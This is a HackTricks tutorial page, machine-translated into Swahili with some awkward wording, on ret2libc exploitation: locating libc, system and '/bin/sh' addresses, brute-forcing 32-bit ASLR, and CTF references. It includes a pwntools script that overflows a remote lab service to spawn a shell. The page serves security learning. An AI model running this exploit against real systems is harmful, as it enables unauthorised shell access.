# Ret2lib

{% hint style="success" %}
Jifunze na zoezi la AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Maelezo Msingi**

Kiini cha **Ret2Libc** ni kurekebisha mtiririko wa utekelezaji wa programu yenye kasoro kwa kazi ndani ya maktaba iliyoshirikiwa (k.m., **system**, **execve**, **strcpy**) badala ya kutekeleza shellcode iliyotolewa na muhusika kwenye stakabadilishi. Muhusika hupanga mzigo wa data ambao unabadilisha anwani ya kurudi kwenye stakabadilishi ili ielekeze kwenye kazi ya maktaba inayotakiwa, huku pia akifanya mipango kwa ajili ya hoja zozote muhimu kuwekwa sawa kulingana na mkataba wa wito.

### **Hatua za Mfano (zilizorahisishwa)**

* Pata anwani ya kazi ya kuita (k.m., system) na amri ya kuita (k.m., /bin/sh)
* Unda mnyororo wa ROP ili kupitisha hoja ya kwanza ikielekeza kwenye mnyororo wa amri na mtiririko wa utekelezaji kwa kazi

## Kutafuta anwani

* Kudhani kwamba `libc` iliyotumiwa ni ile kutoka kwenye mashine ya sasa unaweza kupata mahali itakapopakiwa kumbukani na:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Ikiwa unataka kujua ikiwa ASLR inabadilisha anwani ya libc unaweza kufanya hivi:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Kujua libc iliyotumiwa pia inawezekana kupata kisawe cha kazi ya `system` kwa:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Kujua libc iliyotumiwa pia inawezekana kupata mbali hadi kwa kazi ya string `/bin/sh` na:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Kutumia gdb-peda / GEF

Kwa kujua libc iliyotumika, Pia ni rahisi kutumia Peda au GEF kupata anwani ya kazi ya **system**, ya kazi ya **exit** na ya string **`/bin/sh`**:
```bash
p system
p exit
find "/bin/sh"
```
### Kutumia /proc/\<PID>/maps

Ikiwa mchakato unazalisha **watoto** kila wakati unapozungumza naye (mtandao wa seva) jaribu **kusoma** faili hiyo (labda utahitaji kuwa na ruhusa ya mizizi).

Hapa unaweza kupata **mahali hasa ambapo libc imepakia** ndani ya mchakato na **mahali ambapo itapakia** kwa kila mtoto wa mchakato.

![](<../../../.gitbook/assets/image (853).png>)

Katika kesi hii imepakia katika **0xb75dc000** (Hii itakuwa anwani ya msingi ya libc)

## Libc isiyojulikana

Inaweza kuwa inawezekana kwamba **hujui libc ambayo binary inapakia** (kwa sababu inaweza kuwa mahali ambapo huna ufikiaji wowote). Katika kesi hiyo unaweza kutumia udhaifu wa **kuvuja anwani na kupata ni libc** ipi inayotumiwa:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

Na unaweza kupata kiolezo cha pwntools kwa hili katika:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Jua libc na 2 offsets

Angalia ukurasa [https://libc.blukat.me/](https://libc.blukat.me/) na tumia **anwani kadhaa** za kazi ndani ya libc kugundua **toleo lililotumiwa**.

## Kupitisha ASLR katika biti 32

Mashambulizi haya ya kufanya nguvu ni **yenye manufaa kwa mifumo ya biti 32 tu**.

* Ikiwa shambulio ni la ndani, unaweza kujaribu kufanya nguvu ya anwani ya msingi ya libc (yenye manufaa kwa mifumo ya biti 32):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Kama unashambulia seva ya mbali, unaweza kujaribu **kubaini kwa nguvu anwani ya kazi ya `libc` ya `usleep`**, ukipeleka kama hoja 10 (kwa mfano). Ikiwa kwa wakati fulani **seva inachukua sekunde 10 zaidi kujibu**, umepata anwani ya kazi hii.

## Gadget Moja

Tekeleza kabati kwa kuruka kwa **anwani** moja maalum **katika** libc:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## Mfano wa Msimbo wa x86 Ret2lib

Katika mfano huu, ASLR ya kubaini kwa nguvu imejumuishwa katika msimbo na faili ya binary inayoweza kudhurika iko kwenye seva ya mbali:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## Mfano wa Msimbo wa x64 Ret2lib

Angalia mfano kutoka:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## Mfano wa ARM64 Ret2lib

Katika kesi ya ARM64, maagizo ya `ret` yanaruka mahali ambapo usajili wa x30 unalinganisha na sio mahali ambapo usajili wa steki unalinganisha. Kwa hivyo ni kidogo ngumu zaidi.

Pia katika ARM64 maagizo hufanya kile ambacho maagizo yanafanya (siwezi kuruka katikati ya maagizo na kuyageuza kuwa mengine).

Angalia mfano kutoka:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (au puts)

Hii inaruhusu **kuvuja kwa habari kutoka kwa mchakato** kwa kuita `printf`/`puts` na baadhi ya data maalum iliyowekwa kama hoja. Kwa mfano kuweka anwani ya `puts` katika GOT katika utekelezaji wa `puts` kutavuja anwani ya `puts` kwenye kumbukumbu.

## Ret2printf

Hii kimsingi inamaanisha kutumia **Ret2lib kuiweka katika udhaifu wa herufi za muundo wa `printf`** kwa kutumia `ret2lib` kuita printf na thamani za kutumia (inaonekana haina maana lakini inawezekana):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Mifano Mingine & Marejeo

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, ikitoa uvujaji wa anwani ya kazi katika libc, kutumia kifaa cha moja
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* Biti 64, ASLR imewezeshwa lakini hakuna PIE, hatua ya kwanza ni kujaza kujaza hadi baiti 0x00 ya canary kisha kuita puts na kuvuja. Kwa canary, kifaa cha ROP kinajengwa kuita puts kuvuja anwani ya puts kutoka GOT na kifaa cha ROP kuita `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* Biti 64, ASLR imewezeshwa, hakuna canary, kujaza steki katika kazi kuu kutoka kwa kazi ya mtoto. Kifaa cha ROP kuita puts kuvuja anwani ya puts kutoka GOT na kisha kuita kifaa cha moja.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* Biti 64, hakuna PIE, hakuna canary, hakuna relro, nx. Inatumia kazi ya kuandika kuvuja anwani ya kuandika (libc) na kuita kifaa cha moja.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Inatumia herufi za muundo kuvuja kwa canary kutoka kwa steki na kujaza kijaza kufikia mfumo (iko kwenye GOT) na anwani ya `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* Biti 32, hakuna relro, hakuna canary, nx, pie. Kutumia indexing mbaya kuvuja anwani za libc na heap kutoka kwa steki. Kutumia kujaza kijaza kufanya ret2lib kuita `system('/bin/sh')` (anwani ya heap inahitajika kuvuka ukaguzi).
